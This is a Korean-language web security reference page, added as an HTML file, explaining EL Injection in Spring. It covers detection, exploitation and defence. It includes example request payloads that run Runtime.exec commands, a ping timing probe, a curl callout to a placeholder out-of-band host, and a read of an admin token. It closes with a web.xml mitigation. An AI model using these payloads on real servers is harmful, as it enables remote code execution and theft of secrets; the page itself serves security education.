@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>EL Injection — PIXN</title>
+  <meta name="description" content="EL Injection — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="EL Injection — PIXN"><meta property="og:description" content="EL Injection — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>EL Injection</h1>
+      <time datetime="2022-06-19">JUNE 19, 2022</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>EL(Expression Language) Injection은 Expression을 처리하는 EL interpreter에 대한 Injection 공격으로 <a href="/reference/attack/ssti/">SSTI</a>, <a href="/reference/attack/ognl-injection/">OGNL Injection</a>과 유사함을 가집니다.</p>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<p>만약 Spring에서 Expression을 통해 아래와 같이 처리하고 있다면 param.msg 즉 data란 이름의 파라미터는 Expression Language로 처리되기 떄문에 Injection을 통해서 공격자가 원하는 구문을 주입할 수 있게 됩니다.</p>
+<pre><code class="language-xml hljs"><span class="hljs-name">&lt;spring:message</span> <span class="hljs-attr">code=</span><span class="hljs-string">&quot;${param.data}&quot;</span> <span class="hljs-name">/&gt;</span>
+</code></pre>
+<pre><code>GET /log?data=${param.test}&amp;test=INJECTION HTTP/1.1
+Host: localhost
+</code></pre>
+<p>EL Injection에 대한 탐지는 보통 SSTI와 유사한 형태로 진행되며, 이외에도 직접 Expression 구문을 전송하여 서버가 처리하는 방식을 체크하는 형태로 이루어집니다.</p>
+<pre><code>GET /log?data=${T(java.lang.Runtime).getRuntime().exec(&quot;COMMANDS&quot;)} HTTP/1.1
+Host: localhost
+</code></pre>
+<h4 id="time-based">Time-Based</h4>
+<pre><code>GET /log?data=${T(java.lang.Runtime).getRuntime().exec(&quot;ping -c 5 127.0.0.1&quot;)} HTTP/1.1
+Host: localhost
+</code></pre>
+<p>ping 체크 시 5회 체크하기 때문에 약 5초의 딜레이가 발생합니다.</p>
+<h4 id="oast-based">OAST-Based</h4>
+<pre><code>GET /log?data=${T(java.lang.Runtime).getRuntime().exec(&quot;curl &lt;OAST-SERVICE&gt;&quot;)} HTTP/1.1
+Host: localhost
+</code></pre>
+<p>OAST-SERVICE로 DNS Query와 HTTP Request가 도착하는 것을 확인하여 체크할 수 있습니다.</p>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="rce">RCE</h4>
+<p>Expression은 언어에 따라 다르지만 보통 Server-Side Application에서 처리할 수 있는 권한과 유사한 권한을 가지기 때문에 이를 통해 공격자가 의도한 명령을 전달하고 실행하여 서버를 탈취할 수 있습니다.</p>
+<pre><code>GET /log?data=${T(java.lang.Runtime).getRuntime().exec(&quot;악의적인 명령 실행&quot;)} HTTP/1.1
+Host: localhost
+</code></pre>
+<p>RCE Tirkc은 SSTI에서 Expression에 대해 명시되어 있으니 참고 부탁드립니다.</p>
+<ul>
+<li>https://www.hahwul.com/cullinan/ssti/#ssti-to-rce</li>
+</ul>
+<h4 id="infomation-disclosure">Infomation Disclosure</h4>
+<p>Expression을 통해 Object를 참조할 수 있기 때문에 통제된 Object 내부의 값을 호출하여 정보를 탈취할 수 있습니다.</p>
+<pre><code>GET /log?data=${admin.internalToken} HTTP/1.1
+Host: localhost
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<h3 id="basic">Basic</h3>
+<p>기본적인 대응방안은 SSTI와 동일합니다.</p>
+<blockquote>
+<p>https://www.hahwul.com/cullinan/ssti/#-defensive-techniques</p>
+</blockquote>
+<h3 id="sepl">SePL</h3>
+<p>SePL(Spring Expression Language)의 경우 Spring framework의 web.xml에 <code>springJspExpressionSupport</code>를 <code>false</code>로 지정하여 기본적인 SePL Injection을 예방할 수 있습니다.</p>
+<pre><code class="language-xml hljs"><span class="hljs-name">&lt;context-param</span><span class="hljs-name">&gt;</span>
+  <span class="hljs-name">&lt;description</span><span class="hljs-name">&gt;</span>Spring Expression Language Support<span class="hljs-name">&lt;/description&gt;</span>
+  <span class="hljs-name">&lt;param-name</span><span class="hljs-name">&gt;</span>springJspExpressionSupport<span class="hljs-name">&lt;/param-name&gt;</span>
+  <span class="hljs-name">&lt;param-value</span><span class="hljs-name">&gt;</span>false<span class="hljs-name">&lt;/param-value&gt;</span>
+<span class="hljs-name">&lt;/context-param&gt;</span>
+</code></pre>
+<h2 id="articles">Articles</h2>
+<ul>
+<li>https://www.hahwul.com/2018/08/25/spel-injection-springboot-rce/</li>
+<li>https://www.hahwul.com/cullinan/ssti/</li>
+<li>https://www.hahwul.com/cullinan/ognl-injection/</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li>https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/el-injection/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
